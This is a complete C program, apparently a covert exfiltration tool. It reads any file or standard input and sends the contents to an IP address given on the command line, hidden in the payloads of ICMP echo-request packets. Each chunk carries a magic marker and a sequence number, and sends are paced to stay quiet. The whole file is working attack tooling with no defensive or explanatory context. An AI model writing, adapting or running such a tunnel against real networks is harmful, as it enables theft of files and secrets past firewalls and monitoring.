#define _GNU_SOURCE
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#define MAGIC     0x42415345U
#define CHUNK_MAX 1024
#define DELAY_US  10000

static uint16_t icmp_cksum(const void *data, size_t len)
{
    const uint16_t *p = data; uint32_t s = 0;
    while (len > 1) { s += *p++; len -= 2; }
    if (len) s += *(const uint8_t *)p;
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return (uint16_t)~s;
}

static int send_chunk(int sock, struct sockaddr_in *dst,
                      uint32_t seq, const uint8_t *data, uint16_t dlen)
{
    size_t pkt_sz = sizeof(struct icmphdr) + 10 + dlen;
    uint8_t *pkt  = calloc(1, pkt_sz);

    struct icmphdr *ic = (struct icmphdr *)pkt;
    ic->type             = ICMP_ECHO;
    ic->un.echo.id       = htons((uint16_t)(getpid() & 0xffff));
    ic->un.echo.sequence = htons((uint16_t)(seq & 0xffff));

    uint8_t *p = pkt + sizeof(struct icmphdr);
    uint32_t m = htonl(MAGIC);        memcpy(p, &m, 4); p += 4;
    uint32_t s = htonl(seq);          memcpy(p, &s, 4); p += 4;
    uint16_t l = htons(dlen);         memcpy(p, &l, 2); p += 2;
    memcpy(p, data, dlen);

    ic->checksum = icmp_cksum(pkt, pkt_sz);

    ssize_t n = sendto(sock, pkt, pkt_sz, 0,
                       (struct sockaddr *)dst, sizeof(*dst));
    free(pkt);
    return n < 0 ? -1 : 0;
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("socket (needs CAP_NET_RAW)"); return 1; }

    struct sockaddr_in dst = {};
    dst.sin_family = AF_INET;
    if (inet_pton(AF_INET, argv[1], &dst.sin_addr) <= 0) {
        fprintf(stderr, "bad IP: %s\n", argv[1]); return 1;
    }

    int fd = strcmp(argv[2], "-") == 0 ? STDIN_FILENO : open(argv[2], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    uint8_t chunk[CHUNK_MAX];
    uint32_t seq = 0; uint64_t total = 0; int errors = 0;

    printf("[*] -> %s\n", argv[1]);

    ssize_t n;
    while ((n = read(fd, chunk, CHUNK_MAX)) > 0) {
        if (send_chunk(sock, &dst, seq, chunk, (uint16_t)n) < 0) {
            fprintf(stderr, "[-] seq=%u: %s\n", seq, strerror(errno));
            errors++;
        }
        total += (uint64_t)n; seq++;
        struct timespec ts = { .tv_nsec = DELAY_US * 1000L };
        nanosleep(&ts, NULL);
    }

    if (fd != STDIN_FILENO) close(fd);
    close(sock);
    printf("[*] %u packets  %llu bytes  %d errors\n",
           seq, (unsigned long long)total, errors);
    return errors ? 1 : 0;
}
